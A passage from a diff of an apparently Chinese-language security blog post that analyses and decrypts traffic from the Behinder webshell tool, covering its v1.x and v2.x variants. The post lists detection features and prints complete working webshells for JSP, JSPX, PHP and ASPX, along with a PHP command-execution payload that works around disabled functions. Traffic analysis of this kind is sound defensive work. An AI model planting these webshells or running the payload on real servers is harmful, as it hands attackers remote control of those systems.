class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader())<br>    .g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())))<br>    .newInstance()<br>    .equals(pageContext);<br>%&gt;<br><br><span class="hljs-comment">//加密通信</span><br></code></pre></td></tr></table></figure>
+
+<p>以下两个请求header是固定的，可作为特征判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream<br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<p>对请求使用密钥aes解密，可以看到明显冰蝎特征，最终确定为冰蝎流量</p>
+<p><img src="/mdimg/behinder/1765268511973-933e9a3f-352f-4f18-a5fb-7167c4f87080.png" srcset="/img/loading.gif" lazyload></p>
+<p>解密响应，命令执行响应结果格式为json</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;c3VjY2Vzcw==&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765268665769-e4690515-b131-4224-b741-2b6b81e4de74.png" srcset="/img/loading.gif" lazyload></p>
+<p>密钥是动态的，新会话连接webshell的密钥会不同</p>
+<p>shell.jspx</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;jsp:root xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span> version=<span class="hljs-string">&quot;1.2&quot;</span>&gt;&lt;jsp:directive.page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>/&gt;&lt;jsp:declaration&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)!=<span class="hljs-literal">null</span>)&#123;String k=(<span class="hljs-string">&quot;&quot;</span>+UUID.randomUUID()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">16</span>);session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);out.print(k);<span class="hljs-keyword">return</span>;&#125;Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>((session.getValue(<span class="hljs-string">&quot;u&quot;</span>)+<span class="hljs-string">&quot;&quot;</span>).getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure>
+
+<p>与jsp一样，只不过jspx是xml格式jsp</p>
+<p>shell.php（需要openssl扩展，没有webshell是连不上的）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?php <span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>&#123;<span class="hljs-keyword">public</span> function <span class="hljs-title function_">__invoke</span><span class="hljs-params">($p)</span> &#123;eval($p.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;;session_start();isset($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])?print $_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>]=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>):($b=explode(<span class="hljs-string">&#x27;|&#x27;</span>,openssl_decrypt(file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>), <span class="hljs-string">&quot;AES128&quot;</span>, $_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>])))&amp;<span class="hljs-meta">@call_user_func(new C(),$b[1])</span>;?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>逻辑基本跟jsp一致，只是加解密aes的模式不同，php为<code>AES-128-CBC + 全零 IV</code></p>
+<p>jadx反编译得到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* loaded from: Behinder.jar:net/rebeyond/behinder/core/Crypt.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] DecryptForPhp(<span class="hljs-type">byte</span>[] bs, String key) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] raw = key.getBytes(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bs2 = Base64.decode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(raw, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        cipher.init(<span class="hljs-number">2</span>, skeySpec, <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>]));<br>        <span class="hljs-type">byte</span>[] decrypted = cipher.doFinal(bs2);<br>        <span class="hljs-keyword">return</span> decrypted;<br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765290530187-a2ce47c4-69b9-4225-9117-0c48c940e67f.png" srcset="/img/loading.gif" lazyload></p>
+<p>响应也是json，不过键名顺序跟jsp反过来了</p>
+<p><img src="/mdimg/behinder/1765290258546-1396008a-cec6-4ca5-b274-30a04bc52c44.png" srcset="/img/loading.gif" lazyload></p>
+<p>命令执行也做了一些混淆、绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@error_reporting(0)</span>;<br><br>function <span class="hljs-title function_">getSafeStr</span><span class="hljs-params">($str)</span>&#123;<br>    $s1 = iconv(<span class="hljs-string">&#x27;utf-8&#x27;</span>,<span class="hljs-string">&#x27;gbk//IGNORE&#x27;</span>,$str);<br>    $s0 = iconv(<span class="hljs-string">&#x27;gbk&#x27;</span>,<span class="hljs-string">&#x27;utf-8//IGNORE&#x27;</span>,$s1);<br>    <span class="hljs-keyword">if</span>($s0 == $str)&#123;<br>        <span class="hljs-keyword">return</span> $s0;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> iconv(<span class="hljs-string">&#x27;gbk&#x27;</span>,<span class="hljs-string">&#x27;utf-8//IGNORE&#x27;</span>,$str);<br>    &#125;<br>&#125;<br>function <span class="hljs-title function_">main</span><span class="hljs-params">($cmd)</span><br>&#123;<br>    <span class="hljs-meta">@set_time_limit(0)</span>;<br>    <span class="hljs-meta">@ignore_user_abort(1)</span>;<br>    <span class="hljs-meta">@ini_set(&#x27;max_execution_time&#x27;, 0)</span>;<br>    $result = array();<br>    $PadtJn = <span class="hljs-meta">@ini_get(&#x27;disable_functions&#x27;)</span>;<br>    <span class="hljs-keyword">if</span> (! empty($PadtJn)) &#123;<br>        $PadtJn = preg_replace(<span class="hljs-string">&#x27;/[, ]+/&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, $PadtJn);<br>        $PadtJn = explode(<span class="hljs-string">&#x27;,&#x27;</span>, $PadtJn);<br>        $PadtJn = array_map(<span class="hljs-string">&#x27;trim&#x27;</span>, $PadtJn);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $PadtJn = array();<br>    &#125;<br>    $c = $cmd;<br>    <span class="hljs-keyword">if</span> (FALSE !== strpos(strtolower(PHP_OS), <span class="hljs-string">&#x27;win&#x27;</span>)) &#123;<br>        $c = $c . <span class="hljs-string">&quot; 2&gt;&amp;1\n&quot;</span>;<br>    &#125;<br>    $JueQDBH = <span class="hljs-string">&#x27;is_callable&#x27;</span>;<br>    $Bvce = <span class="hljs-string">&#x27;in_array&#x27;</span>;<br>    <span class="hljs-keyword">if</span> ($JueQDBH(<span class="hljs-string">&#x27;system&#x27;</span>) and ! $Bvce(<span class="hljs-string">&#x27;system&#x27;</span>, $PadtJn)) &#123;<br>        ob_start();<br>        system($c);<br>        $kWJW = ob_get_contents();<br>        ob_end_clean();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($JueQDBH(<span class="hljs-string">&#x27;proc_open&#x27;</span>) and ! $Bvce(<span class="hljs-string">&#x27;proc_open&#x27;</span>, $PadtJn)) &#123;<br>        $handle = proc_open($c, array(<br>            array(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;r&#x27;</span><br>            ),<br>            array(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;w&#x27;</span><br>            ),<br>            array(<br>                <span class="hljs-string">&#x27;pipe&#x27;</span>,<br>                <span class="hljs-string">&#x27;w&#x27;</span><br>            )<br>        ), $pipes);<br>        $kWJW = NULL;<br>        <span class="hljs-keyword">while</span> (! feof($pipes[<span class="hljs-number">1</span>])) &#123;<br>            $kWJW .= fread($pipes[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>);<br>        &#125;<br>        <span class="hljs-meta">@proc_close($handle)</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($JueQDBH(<span class="hljs-string">&#x27;passthru&#x27;</span>) and ! $Bvce(<span class="hljs-string">&#x27;passthru&#x27;</span>, $PadtJn)) &#123;<br>        ob_start();<br>        passthru($c);<br>        $kWJW = ob_get_contents();<br>        ob_end_clean();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($JueQDBH(<span class="hljs-string">&#x27;shell_exec&#x27;</span>) and ! $Bvce(<span class="hljs-string">&#x27;shell_exec&#x27;</span>, $PadtJn)) &#123;<br>        $kWJW = shell_exec($c);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($JueQDBH(<span class="hljs-string">&#x27;exec&#x27;</span>) and ! $Bvce(<span class="hljs-string">&#x27;exec&#x27;</span>, $PadtJn)) &#123;<br>        $kWJW = array();<br>        exec($c, $kWJW);<br>        $kWJW = join(chr(<span class="hljs-number">10</span>), $kWJW) . chr(<span class="hljs-number">10</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($JueQDBH(<span class="hljs-string">&#x27;exec&#x27;</span>) and ! $Bvce(<span class="hljs-string">&#x27;popen&#x27;</span>, $PadtJn)) &#123;<br>        $fp = popen($c, <span class="hljs-string">&#x27;r&#x27;</span>);<br>        $kWJW = NULL;<br>        <span class="hljs-keyword">if</span> (is_resource($fp)) &#123;<br>            <span class="hljs-keyword">while</span> (! feof($fp)) &#123;<br>                $kWJW .= fread($fp, <span class="hljs-number">1024</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@pclose($fp)</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $kWJW = <span class="hljs-number">0</span>;<br>        $result[<span class="hljs-string">&quot;status&quot;</span>] = base64_encode(<span class="hljs-string">&quot;fail&quot;</span>);<br>        $result[<span class="hljs-string">&quot;msg&quot;</span>] = base64_encode(<span class="hljs-string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);<br>        $key = $_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>];<br>        echo <span class="hljs-title function_">openssl_encrypt</span><span class="hljs-params">(json_encode($result)</span>, <span class="hljs-string">&quot;AES128&quot;</span>, $key);<br>        <span class="hljs-keyword">return</span>;<br>        <br>    &#125;<br>    $result[<span class="hljs-string">&quot;status&quot;</span>] = base64_encode(<span class="hljs-string">&quot;success&quot;</span>);<br>    $result[<span class="hljs-string">&quot;msg&quot;</span>] = base64_encode(getSafeStr($kWJW));<br>    echo <span class="hljs-title function_">openssl_encrypt</span><span class="hljs-params">(json_encode($result)</span>, <span class="hljs-string">&quot;AES128&quot;</span>, $_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>]);<br>&#125;$cmd=<span class="hljs-string">&quot;whoami&quot;</span>;<br>main($cmd);<br></code></pre></td></tr></table></figure>
+
+<p>shell.aspx</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ Page Language=<span class="hljs-string">&quot;C#&quot;</span> %&gt;&lt;%<span class="hljs-meta">@Import</span> Namespace=<span class="hljs-string">&quot;System.Reflection&quot;</span>%&gt;&lt;%<span class="hljs-keyword">if</span> (Request[<span class="hljs-string">&quot;pass&quot;</span>]!=<span class="hljs-literal">null</span>)&#123; Session.Add(<span class="hljs-string">&quot;k&quot;</span>, Guid.NewGuid().ToString().Replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).Substring(<span class="hljs-number">16</span>)); Response.Write(Session[<span class="hljs-number">0</span>]); <span class="hljs-keyword">return</span>;&#125;<span class="hljs-type">byte</span>[] k = Encoding.Default.GetBytes(Session[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&quot;</span>),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">System</span>.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="hljs-number">0</span>, c.Length)).CreateInstance(<span class="hljs-string">&quot;U&quot;</span>).Equals(<span class="hljs-built_in">this</span>);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>解密方法，同样是<code>AES-128-CBC</code> 但这里IV不是全0（16进制），而是<code>key=IV</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] DecryptForCSharp(<span class="hljs-type">byte</span>[] bs, String key) <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] raw = key.getBytes(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>    <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(raw);<br>    <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(raw, <span class="hljs-string">&quot;AES&quot;</span>);<br>    <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>    cipher.init(<span class="hljs-number">2</span>, skeySpec, iv);<br>    <span class="hljs-type">byte</span>[] decrypted = cipher.doFinal(bs);<br>    <span class="hljs-keyword">return</span> decrypted;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765348490109-1168fb2d-dbec-4ab8-8244-542bf71c5b37.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="V2-x"><a href="#V2-x" class="headerlink" title="V2.x"></a>V2.x</h1><p><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip</a></p>
+<p>环境：windows11+tomcat9+jdk1.8</p>
+<p>shell.jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)!=<span class="hljs-literal">null</span>)&#123;String k=(<span class="hljs-string">&quot;&quot;</span>+UUID.randomUUID()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">16</span>);session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);out.print(k);<span class="hljs-keyword">return</span>;&#125;Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>((session.getValue(<span class="hljs-string">&quot;u&quot;</span>)+<span class="hljs-string">&quot;&quot;</span>).getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>加密解密同v1.x</p>
+<p>但是v2.x连接会有两次请求<code>?pass=xx</code>密钥，第二次返回的密钥才是加解密的密钥</p>
+<p><img src="/mdimg/behinder/1765269653223-9e1adf9f-3658-4ac3-8dfe-3fba0c671719.png" srcset="/img/loading.gif" lazyload></p>
+<p>v2.x连接webshell时可以自定义请求头</p>
+<p><img src="/mdimg/behinder/1765269227959-e7dc01c0-b436-4dc8-bf4f-ff7de345b57b.png" srcset="/img/loading.gif" lazyload></p>
+<p>特征header（辅助判断，因为请求头可以自定义）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream<br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<p>最终确定是否是冰蝎webshell还是同v1.x拿密钥解密请求和响应。</p>
+<p>shell.php</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?php<br><span class="hljs-meta">@error_reporting(0)</span>;<br>session_start();<br><span class="hljs-keyword">if</span> (isset($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))<br>&#123;<br>    $key=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);<br>    $_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>]=$key;<br>    print $key;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    $key=$_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>];<br>	$post=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		$t=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		$post=$t($post.<span class="hljs-string">&quot;&quot;</span>);<br>		<br>		<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($post);$i++) &#123;<br>    			 $post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    			&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		$post=openssl_decrypt($post, <span class="hljs-string">&quot;AES128&quot;</span>, $key);<br>	&#125;<br>    $arr=explode(<span class="hljs-string">&#x27;|&#x27;</span>,$post);<br>    $func=$arr[<span class="hljs-number">0</span>];<br>    $params=$arr[<span class="hljs-number">1</span>];<br>	<span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>&#123;<span class="hljs-keyword">public</span> function <span class="hljs-title function_">__construct</span><span class="hljs-params">($p)</span> &#123;eval($p.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>	<span class="hljs-meta">@new</span> C($params);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>同样会有两次key的请求</p>
+<p><img src="/mdimg/behinder/1765291784782-82971a10-4fac-4f5e-b398-3272adbcd2a3.png" srcset="/img/loading.gif" lazyload></p>
+<p>php加解密aes依赖于<code>&lt;font style=&quot;color:rgb(17, 17, 51);&quot;&gt;OpenSSL扩展&lt;/font&gt;</code>，加解密同样是<code>AES-128-CBC  全零（16进制32个0） IV</code></p>
+<p>冰蝎v2.x当环境不支持<code>&lt;font style=&quot;color:rgb(17, 17, 51);&quot;&gt;OpenSSL&lt;/font&gt;</code><font style="color:rgb(17, 17, 51);">扩展时会改用</font><code>&lt;font style=&quot;color:rgb(17, 17, 51);&quot;&gt;xor&lt;/font&gt;</code><font style="color:rgb(17, 17, 51);">加解密</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		$t=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		$post=$t($post.<span class="hljs-string">&quot;&quot;</span>);<br>		<br>		<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($post);$i++) &#123;<br>    			 $post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    			&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>并且返回key后的第一次请求依然会尝试使用aes加解密，不成功才会改为xor（<font style="color:#DF2A3F;">这是冰蝎v2.x不支持openssl扩展的特征）</font></p>
+<p><img src="/mdimg/behinder/1765347389374-5debd1b3-7700-4bfd-974d-e3b4de6995e3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/behinder/1765347400685-efa9ad31-313f-4b3a-afd8-72241eb011de.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面的请求才会使用xor</p>
+<p><img src="/mdimg/behinder/1765347485090-37dc575a-5d96-4947-bd3b-ed82634264da.png" srcset="/img/loading.gif" lazyload></p>
+<p>解密python</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> <span class="hljs-type">base64</span><br><br><span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;4b9ce250bc3ab0f9&quot;</span>  # <span class="hljs-number">16</span> <span class="hljs-type">chars</span><br><span class="hljs-variable">b64_ciphertext</span> <span class="hljs-operator">=</span> <span 